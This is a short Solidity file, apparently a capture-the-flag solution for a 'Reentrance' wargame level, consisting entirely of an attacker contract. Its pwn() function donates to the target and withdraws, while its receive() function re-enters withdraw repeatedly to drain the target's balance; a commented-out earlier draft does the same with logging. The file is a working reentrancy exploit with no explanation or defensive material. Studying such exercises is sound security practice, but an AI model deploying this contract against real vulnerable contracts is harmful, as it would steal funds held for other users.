//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "./Reentrance.sol";

contract Reentrance_exp {
    Reentrance r;
    uint256 amount = 100;

    constructor(address payable addr) public  payable{
        r = Reentrance(addr);
    }

    receive() external payable {
        if (address(r).balance >= amount) {
            r.withdraw(amount);
        }
    }

    function pwn() external payable {
        r.donate{value: amount}(address(this));
        r.withdraw(amount);
    }

    // Reentrance victim;
    // uint256 amount = 0.001 ether;
    // constructor() payable {
    // }

    // function pwn(address payable v) public payable {
    //     victim = Reentrance(v);
    //     victim.donate{value: 0.0005 ether}(address(this));
    //     victim.withdraw(0.0005 ether);
    //     console2.log("[-]", victim.balanceOf(address(this)));
    // }
    
    // receive() external payable {
    //     console2.log("[+]", address(victim).balance);
    //     // // console2.log("[-]", victim.balanceOf(address(this)));
    //     // // if(address(victim).balance > 0){
    //     // //     victim.withdraw(0.0005 ether);
    //     // // }

    //     // if (address(victim).balance >= amount) {
    //     victim.withdraw(address(victim).balance);
    //     // }
    //     console2.log("[-]", victim.balanceOf(address(this)));
    // }
}

